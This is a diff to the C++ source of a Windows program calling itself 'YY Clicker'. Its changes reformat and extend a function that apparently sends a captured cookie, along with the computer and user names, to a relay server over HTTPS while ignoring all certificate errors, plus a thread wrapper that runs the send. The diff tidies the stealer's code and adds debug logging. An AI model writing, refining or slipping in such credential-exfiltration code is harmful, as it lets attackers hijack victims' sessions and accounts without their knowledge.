@@ -429,16 +429,28 @@ static std::string JsonEscape(const char* raw)
     std::string out;
     if (!raw) return out;
     out.reserve(strlen(raw) + 64);
-    for (const char* p = raw; *p; ++p) {
-        switch (*p) {
+    for (const char* p = raw; *p; ++p)
+    {
+        switch (*p)
+        {
         case '"':  out += "\\\""; break;
         case '\\': out += "\\\\"; break;
+        case '\b': out += "\\b";  break;
+        case '\f': out += "\\f";  break;
         case '\n': out += "\\n";  break;
         case '\r': out += "\\r";  break;
         case '\t': out += "\\t";  break;
         default:
-            if ((unsigned char)*p < 0x20) { char hex[8]; sprintf(hex, "\\u%04x", (unsigned char)*p); out += hex; }
-            else out += *p;
+            if ((unsigned char)*p < 0x20)
+            {
+                char hex[8];
+                sprintf(hex, "\\u%04x", (unsigned char)*p);
+                out += hex;
+            }
+            else
+            {
+                out += *p;
+            }
             break;
         }
     }
@@ -474,6 +486,7 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
     DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
     GetComputerNameW(computer_name, &cn_size);
+
     wchar_t user_name[256] = {};
     DWORD un_size = 256;
     GetUserNameW(user_name, &un_size);
@@ -481,9 +494,11 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     int cookie_utf8_len = WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, nullptr, 0, nullptr, nullptr);
     char* cookie_utf8 = new char[cookie_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, cookie_utf8, cookie_utf8_len, nullptr, nullptr);
+
     int cn_utf8_len = WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, nullptr, 0, nullptr, nullptr);
     char* cn_utf8 = new char[cn_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, cn_utf8, cn_utf8_len, nullptr, nullptr);
+
     int un_utf8_len = WideCharToMultiByte(CP_UTF8, 0, user_name, -1, nullptr, 0, nullptr, nullptr);
     char* un_utf8 = new char[un_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);
@@ -494,19 +509,47 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     json += "\"cookie\":\"";        json += JsonEscape(cookie_utf8); json += "\",";
     json += "\"source\":\"YY Clicker\"";
     json += "}";
-    delete[] cookie_utf8; delete[] cn_utf8; delete[] un_utf8;
 
-    HINTERNET hSession = WinHttpOpen(L"YYClicker/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) { DebugLog("WinHttpOpen failed"); return; }
+    delete[] cookie_utf8;
+    delete[] cn_utf8;
+    delete[] un_utf8;
+
+    DebugLog("JSON assembled OK");
+
+    HINTERNET hSession = WinHttpOpen(
+        L"YYClicker/2.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
+    if (!hSession)
+    {
+        char err[128]; sprintf(err, "WinHttpOpen failed: %lu", GetLastError());
+        DebugLog(err); return;
+    }
+
     DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
     WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
-    HINTERNET hConnect = WinHttpConnect(hSession, RELAY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) { DebugLog("WinHttpConnect failed"); WinHttpCloseHandle(hSession); return; }
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", RELAY_SERVER_PATH, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
 
-    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    HINTERNET hConnect = WinHttpConnect(hSession, RELAY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect)
+    {
+        char err[128]; sprintf(err, "WinHttpConnect failed: %lu", GetLastError());
+        DebugLog(err); WinHttpCloseHandle(hSession); return;
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", RELAY_SERVER_PATH,
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest)
+    {
+        char err[128]; sprintf(err, "WinHttpOpenRequest failed: %lu", GetLastError());
+        DebugLog(err); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return;
+    }
+
+    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
     WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
+
     DWORD timeout = 15000;
     WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
     timeout = 30000;
@@ -514,16 +557,42 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
 
     const wchar_t* headers = L"Content-Type: application/json\r\n";
-    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers), (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);
-    if (bResult) {
-        WinHttpReceiveResponse(hRequest, nullptr);
-        DWORD statusCode = 0, statusSize = sizeof(statusCode);
-        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
-        char logMsg[128]; sprintf(logMsg, "Response: HTTP %lu", statusCode);
-        DebugLog(logMsg);
+    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
+        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);
+    if (!bResult)
+    {
+        char err[128]; sprintf(err, "WinHttpSendRequest failed: %lu", GetLastError());
+        DebugLog(err);
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+        return;
     }
+
+    bResult = WinHttpReceiveResponse(hRequest, nullptr);
+    if (!bResult)
+    {
+        char err[128]; sprintf(err, "WinHttpReceiveResponse failed: %lu", GetLastError());
+        DebugLog(err);
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    DWORD statusCode = 0, statusSize = sizeof(statusCode);
+    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
+
+    char respBuf[2048] = {};
+    DWORD bytesRead = 0;
+    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);
+
+    char logMsg[256];
+    sprintf(logMsg, "Response: HTTP %lu, body=%lu bytes", statusCode, bytesRead);
+    DebugLog(logMsg);
+    if (bytesRead > 0 && bytesRead < 512) DebugLog(respBuf);
+
     DebugLog("=== SendCookieToRelay END ===");
-    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
 }
 
 static DWORD WINAPI SendCookieThread(LPVOID lpParam) { wchar_t* cookie = (wchar_t*)lpParam; if (cookie) { SendCookieToRelay(cookie); delete[] cookie; } return 0; }
